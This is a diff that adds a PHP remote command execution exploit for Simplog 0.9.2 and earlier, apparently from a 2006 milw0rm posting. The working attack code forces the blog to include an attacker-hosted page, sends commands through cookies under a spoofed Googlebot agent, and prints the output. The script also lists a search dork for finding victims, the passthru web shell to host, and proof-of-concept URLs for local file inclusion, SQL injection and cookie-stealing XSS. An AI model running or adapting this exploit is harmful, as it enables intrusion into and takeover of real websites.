@@ -1,0 +1,183 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?
+echo "Simplog <= 0.9.2 \"s\" remote cmmnds xctn\r\n";
+echo "by rgod rgod@autistici.org\r\n";
+echo "site: http://retrogod.altervista.org\r\n\r\n";
+echo "dork: intext:\"Powered by simplog\"\r\n\r\n";
+
+if ($argc<5) {
+echo "Usage: php ".$argv[0]." host path location cmd OPTIONS\r\n";
+echo "host:      target server (ip/hostname)\r\n";
+echo "path:      path to simplog\r\n";
+echo "location:  an arbitrary location with the code to include\r\n";
+echo "cmd:       a shell command\r\n";
+echo "Options:\r\n";
+echo "   -p[port]:    specify a port other than 80\r\n";
+echo "   -P[ip:port]: specify a proxy\r\n";
+echo "Examples:\r\n";
+echo "php ".$argv[0]." localhost /simplog/ http://somehost.com ls -la\r\n";
+echo "php ".$argv[0]." localhost /simplog/ http://somehost.com/subdir ls -la -p81\r\n";
+echo "php ".$argv[0]." localhost / http://somehost.com cat ./../config.php -P1.1.1.1:80\r\n\r\n";
+echo "note, you need this code in http://somehost.com/suntzu.html:\r\n";
+echo "<?php\r\n";
+echo "if (get_magic_quotes_gpc()){\$_REQUEST[\"cmd\"]=stripslashes(\$_REQUEST[\"cmd\"]);}\r\n";
+echo "ini_set(\"max_execution_time\",0);\r\n";
+echo "echo \"*delim*\";\r\n";
+echo "passthru(\$_REQUEST[\"cmd\"]);\r\n";
+echo "echo \"*delim*\";\r\n";
+echo "?>\r\n";
+die;
+}
+
+/*
+ software site: http://www.simplog.org/
+
+ description: "Simplog provides an easy way for users to add blogging capabilities
+ to their existing websites. Simplog is written in PHP and compatible with multiple
+ databases. Simplog also features an RSS/Atom aggregator/reader.
+ Powerful, yet simple......."
+
+
+ i)  vulnerable code in doc/index.php at lines:
+  ...
+  <?php
+
+	if(isset($_REQUEST['s'])) {
+		include($_REQUEST['s'].".html");
+	}
+
+  ?>
+  ...
+
+  nice code, isn't it? :)
+  poc:
+  http://[target]/[path]/doc/index.php?cmd=ls%20-la&s=http://somehost.com/suntzu
+  (but you can submit arguments even trough cookies or POST data...)
+
+  or:
+  http://[target]/[path]/doc/index.php?s=../../../../var/httpd/logs/error_log%00
+
+  ii)
+  http://[target]/[path]/index.php?blogid=[sql]
+  http://[target]/[path]/archive.php?blogid=[sql]
+  http://[target]/[path]/archive.php?m=[sql]
+  http://[target]/[path]/archive.php?y=[sql]
+
+  iii)
+  http://[target]/[path]/adodb/server.php?sql=[sql]
+  http://[target]/[path]/adodb/tests/tmssql.php?do=phpinfo
+
+  iv) xss:
+  http://[target]/[path]/login.php?btag=<script>alert(document.cookie)</script>
+
+  this is the exploit for i), works with allow_url_fopen = On
+                                                                              */
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+  #debug
+  #echo "\r\n".$html;
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$loc=$argv[3];
+if (($path[0]<>'/') | ($path[strlen($path)-1]<>'/'))
+{die("Check the path, it must begin and end with a trailing slash\r\n");}
+$port=80;
+$proxy="";
+$cmd="";
+for ($i=4; $i<=$argc-1; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>"-p") and ($temp<>"-P"))
+{
+$cmd.=" ".$argv[$i];
+}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+$cmd=urlencode($cmd);
+if ($proxy<>'') {$p="http://".$host.":".$port.$path;} else {$p=$path;}
+
+$packet ="GET ".$p."doc/index.php HTTP/1.0\r\n";
+$packet.="User-Agent: Googlebot/2.1\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Cookie: s=".$loc."%2fsuntzu; cmd=".$cmd.";\r\n"; //through cookies, log this :)
+$packet.="Connection: Close\r\n\r\n";
+#debug
+#echo quick_dump($packet);
+sendpacketii($packet);
+if (strstr($html,"*delim*"))
+{$temp=explode("*delim*",$html);
+ echo "Exploit succeeded...\r\n\r\n";
+ echo $temp[1];
+}
+else
+{
+#debug
+echo $html."\r\n";
+echo "Exploit failed...";
+}
+?>
+
+# milw0rm.com [2006-04-11]
